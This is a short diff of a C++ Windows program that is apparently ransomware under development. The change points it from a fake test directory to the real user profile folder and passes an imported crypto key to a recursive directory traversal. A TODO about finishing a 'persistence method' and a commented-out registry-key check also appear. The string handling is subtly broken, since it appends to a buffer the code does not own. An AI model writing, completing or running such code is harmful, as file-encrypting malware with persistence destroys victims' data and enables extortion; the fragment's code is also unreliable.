@@ -1,33 +1,34 @@
 #include <iostream>
 #include <Windows.h>
-#include <string>
+#include "strsafe.h"
+#include <ShlObj.h>
+
+//TODO ; finish persistence method
 
 
 
-
-
-
-//Function declarations
 
 bool traverse(LPCWSTR targetDir, HCRYPTKEY clé,int nLevel = 0);
 HCRYPTKEY keyimport();
+//int checkForRegkey();
 
 
 //Main
 
-int wmain() {
+int main() {
 
-	//TODO ; use the getusername func and a bit of string manipulation for the dirs absolute path
-
-	LPCWSTR targetDirs[] = { L"C:\\dev\\fake_dir" };
-	
+	//int checkForRegkey();
+	LPCWSTR targetDirs[] = { L"\\fakedir" };
+	LPWSTR userDir;
+	SHGetKnownFolderPath(FOLDERID_Profile,0,NULL,&userDir);
 
 	HCRYPTKEY key = keyimport();
 
 	for (LPCWSTR singledir : targetDirs) {
 		
-		
-		traverse(singledir,key);
+		WCHAR* absoluteDirPath = userDir;
+		StringCchCatW(absoluteDirPath, MAX_PATH, singledir);
+		traverse(absoluteDirPath,key);
 	}
 
 	return 0;
